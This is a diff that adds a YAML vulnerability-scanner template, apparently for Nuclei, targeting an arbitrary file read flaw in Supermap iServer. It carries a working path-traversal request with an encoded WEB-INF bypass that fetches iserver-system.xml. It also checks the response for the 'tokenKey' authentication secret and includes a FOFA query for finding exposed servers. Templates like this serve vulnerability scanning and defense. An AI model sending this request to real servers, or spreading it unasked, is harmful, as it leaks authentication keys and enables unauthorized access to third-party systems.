@@ -1,0 +1,30 @@
+id: supermap-iserver-fileread
+info:
+  name: Supermap iServer任意文件读取漏洞
+  author: leadlife
+  severity: high
+  description: 北京超图软件股份有限公司是聚焦地理信息软件和空间智能领域的基础软件与应用软件厂商，Supermap iServer 存在文件读取漏洞，攻击者可获取用于认证的tokenKey
+  reference: 
+    - https://github.com/eeeeeeeeee-code/POC/blob/87a48191f2c0e2c9a3b71072cebd3297326fee50/wpoc/Supermap%20iServer/Supermap%20iServer%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: icon_hash="-1656662001"
+    tips:
+    repair:
+    version:
+  tags: supermap,fileread,iserver
+
+http:
+  - raw:
+      - |
+        GET /iserver/output/../WEB-IN%2546/iserver-system.xml HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'xml version','tokenKey')
+        condition: and
